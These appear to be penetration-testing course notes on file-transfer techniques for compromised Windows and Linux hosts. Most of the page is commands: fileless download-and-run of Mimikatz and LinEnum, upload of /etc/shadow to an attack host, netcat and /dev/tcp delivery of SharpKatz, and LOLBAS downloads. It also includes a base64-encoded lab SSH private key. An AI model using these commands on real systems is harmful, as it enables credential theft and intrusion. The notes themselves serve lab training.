
## 1.Windows File Transfer Methods

## Download Operations

### PowerShell Base64 Encode & Decode

```
md5sum id_rsa
```

**Encode SSH Key to Base64**

```
cat id_rsa |base64 -w 0;echo
```

* copy this content and paste it into a Windows PowerShell terminal

```
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```

* Finally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet

```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

***

### PowerShell Web Downloads

```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### PowerShell DownloadString - Fileless Method

```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### PowerShell Invoke-WebRequest

```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

* There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

### -UseBasicParsing

```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

* Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted.

### SSL/TLS bypass certificate not trusted

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

***

## SMB Downloads

{% embed url="<https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py>" %}

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

* Copy a File from the SMB Server

```
C:\htb> copy \\192.168.220.133\share\nc.exe
```

***

New versions of Windows block unauthenticated guest access To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

**Mount the SMB Server with Username and Password**

```
C:\htb> net use n: \\192.168.220.133\share /user:test test
```

## FTP Downloads

```
sudo pip3 install pyftpdlib
```

**Setting up a Python3 FTP Server**

```
sudo python3 -m pyftpdlib --port 21
```

**Transferring Files from an FTP Server Using PowerShell**

```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

***

* When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file.

**Create a Command File for the FTP Client and Download the Target File**

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
```

***

## Upload Operations

**Encode File Using PowerShell**

```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

* copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.

**Decode Base64 String in Linux**

```
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

```shell-session
md5sum hosts 
```

***

### PowerShell Web Uploads

**Installing a Configured WebServer with Upload**

```
pip3 install uploadserver
python3 -m uploadserver
```

* Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform the upload operations.

**PowerShell Script to Upload a File to Python Upload Server**

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

***

### PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat.

```
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

* We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.

```powershell
nc -lvnp 8000

# we will get a base64 one liner in output simply decode it
echo <base64> | base64 -d -w 0 > hosts
```

***

## SMB Uploads

* To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot`

{% embed url="<https://github.com/mar10/wsgidav>" %}

**Installing WebDav Python modules**

```
sudo pip3 install wsgidav cheroot
```

**Using the WebDav Python module**

```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Connecting to the Webdav Share**

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

```
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

> Note: `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
>
> You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

**Uploading Files using SMB**

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

> Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

***

## FTP Uploads

```
sudo python3 -m pyftpdlib --port 21 --write
```

Now let's use the PowerShell upload function to upload a file to our FTP Server.

```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

* **Create a Command File for the FTP Client to Upload a File**

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

***

## 2.Linux File Transfer Methods

### Download Operations

### Base64 Encoding / Decoding

* **Check File MD5 hash**

```powershell
md5sum id_rsa

# you will see a base64 output
```

* **Encode SSH Key to Base64**

```
cat id_rsa |base64 -w 0;echo
```

* copy this content, paste it onto our Linux target machine, and use `base64` with the option \`-d' to decode it.

**Linux - Decode the File**

```
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

```
md5sum id_rsa
```

### Downloads with Wget and cURL

**Download a File Using wget**

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

**Download a File Using cURL**

```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

***

## Fileless Attacks Using Linux

> Note: Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.

**Fileless Download with cURL**

```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

* Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.

```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Download with Bash (/dev/tcp)

**Connect to the Target Webserver**

```
exec 3<>/dev/tcp/10.10.10.32/80
```

**HTTP GET Request**

```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

**Print the Response**

```
cat <&3
```

***

### SSH Downloads

**Enabling the SSH Server**

```
sudo systemctl enable ssh
```

**Starting the SSH Server**

```
sudo systemctl start ssh
```

**Checking for SSH Listening Port**

```
netstat -lnpt
```

**Linux - Downloading Files Using SCP**

Now we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.

```
scp plaintext@192.168.49.128:/root/myroot.txt .
```

***

## Upload Operations

{% embed url="<https://github.com/Densaugeo/uploadserver>" %}

### Web Upload

&#x20;**Start Web Server - in our machine**

```shell-session
sudo python3 -m pip install --user uploadserver
```

**Create a Self-Signed Certificate**

```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

* The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

**Start Web Server**

```
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

* Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

**Upload Multiple Files**

```
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

***

## Alternative Web File Transfer Method

**Linux - Creating a Web Server with Python3**

```
python3 -m http.server
```

**Creating a Web Server with Python2.7**

```
python2.7 -m SimpleHTTPServer
```

**Creating a Web Server with PHP**

```
 php -S 0.0.0.0:8000
```

**Creating a Web Server with Ruby**

```
ruby -run -ehttpd . -p8000
```

**Download the File from the Target Machine**&#x20;

```
wget 192.168.49.128:8000/filetotransfer.txt
```

***

## SCP Upload

**File Upload using SCP**

```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

***

## 3.Transferring Files with Code

## Python

### Python 2 - Download

```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### **Python 3 - Download**

```
 python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## PHP

### PHP Download with File\_get\_contents()

```
 php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

* An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.

### PHP Download with Fopen()

```
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

### PHP Download a File and Pipe it to Bash

```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby

### **Ruby - Download a File**

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Perl

### Perl - Download a File

```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript

{% embed url="<https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068>" %}

* We'll create a file called `wget.js` and save the following content:

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

* We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

### Download a File Using JavaScript and cscript.exe

```
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript

{% embed url="<https://stackoverflow.com/questions/2973136/download-a-file-with-vbs>" %}

* We'll create a file called `wget.vbs` and save the following content:

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

* We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

### **Download a File Using VBScript and cscript.exe**

```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

***

## Upload Operations using Python3

{% embed url="<https://github.com/Densaugeo/uploadserver>" %}

**Starting the Python uploadserver**

```
python3 -m uploadserver 
```

**Uploading a File Using a Python One-liner**

```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

***

## 4.Miscellaneous File Transfer Methods

### File Transfer with Netcat and Ncat

we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our machine onto the compromised machine

**NetCat - Compromised Machine - Listening on Port 8000**

```shell-session
nc -l -p 8000 > SharpKatz.exe
```

* If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

**Ncat - Compromised Machine - Listening on Port 8000**

```
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

***

**Netcat - Attack Host - Sending File to Compromised machine**

```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

# Example using Original Netcat
 nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Ncat - Attack Host - Sending File to Compromised machine**

```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

# Example using Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

**Attack Host - Sending File as Input to Netcat**

```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Compromised Machine Connect to Netcat to Receive the File**

```
 nc 192.168.49.128 443 > SharpKatz.exe
```

## Ncat

**Attack Host - Sending File as Input to Ncat**

```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine Connect to Ncat to Receive the File**

```shell-session
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

***

**NetCat - Sending File as Input to Netcat**

```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

**Ncat - Sending File as Input to Ncat**

```shell-session
 sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**

```shell-session
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Session File Transfer

```
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

**Copy samplefile.txt from our Localhost to the DATABASE01 Session**

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Copy DATABASE.txt from DATABASE01 Session to our Localhost**

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

**Mounting a Linux Folder Using rdesktop**

```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

**Mounting a Linux Folder Using xfreerdp**

```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FxJC4vuyppKZjAFHfRdOr%2Fimage.png?alt=media&amp;token=9d4892d8-dc2b-4821-b560-99c653609d42" alt=""><figcaption></figcaption></figure>

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FfM6OdI9MsbdvqWrKWGIx%2Fimage.png?alt=media&amp;token=b6fb9e6e-6986-4ccd-a2d4-194bd2d008ce" alt=""><figcaption></figcaption></figure>

## 4.Protected File Transfers

{% embed url="<https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions/Invoke-AESEncryption.ps1>" %}

### Invoke-AESEncryption.ps1

```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

After the script is imported, it can encrypt strings or files, as shown in the following examples.

**File Encryption Example**

```powershell-session
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

### File Encryption on Linux

**Encrypting /etc/passwd with openssl**

```shell-session
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

**Decrypt passwd.enc with openssl**

```shell-session
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

***

## 5.Catching Files over HTTP/S

### Nginx - Enabling PUT

A good alternative for transferring files to `Apache` is [Nginx](https://www.nginx.com/resources/wiki/)&#x20;

**Create a Directory to Handle Uploaded Files**

```shell-session
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

**Change the Owner to www-data**

```shell-session
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

**Create Nginx Configuration File**

Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents:

```shell-session
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

**Symlink our Site to the sites-enabled Directory**

```shell-session
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

**Start Nginx**

```shell-session
sudo systemctl restart nginx.service
```

* If we get any error messages, check `/var/log/nginx/error.log`

**Verifying Errors**

```shell-session
tail -2 /var/log/nginx/error.log
```

```shell-session
ss -lnpt | grep 80
ps -ef | grep 2811
```

**Remove NginxDefault Configuration**

```shell-session
sudo rm /etc/nginx/sites-enabled/default
```

Now we can test uploading by using `cURL` to send a `PUT` request. In the below example, we will upload the `/etc/passwd` file to the server and call it users.txt

**Upload File Using cURL**

```shell-session
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

```shell-session
 sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
```

Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to `http://localhost/SecretUploadDirectory`.

***

## 6.Living off The Land

### LOLBAS

For windows&#x20;

{% embed url="<https://lolbas-project.github.io/>" %}

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FjsnpHGnTvBOZW4V5KJzR%2Fimage.png?alt=media&amp;token=2c665f0e-34be-493e-ad4f-e2d958aac4ee" alt=""><figcaption></figcaption></figure>

* Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.

**Upload win.ini to our machine**

```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

**File Received in our Netcat Session**

```shell-session
sudo nc -lvnp 8000
```

***

**Error Debug:**\
<https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe>

### GTFOBins

For Linux

{% embed url="<https://gtfobins.github.io/>" %}

we can use `+file download` or `+file upload`.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F1Rs8ObdmktFXL3BqSlo4%2Fimage.png?alt=media&amp;token=0299efd8-5fe2-4d45-9378-968060853722" alt=""><figcaption></figcaption></figure>

{% embed url="<https://www.openssl.org/>" %}

* It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

**Create Certificate**

```shell-session
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

\
**Stand up the Server in our machine**

```shell-session
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**Download File from the Compromised Machine**

```shell-session
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

***

## Other Common Living off the Land tools

### Bitsadmin Download function

**File Download with Bitsadmin**

```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

**Download**

```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil

**Download a File with Certutil**

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

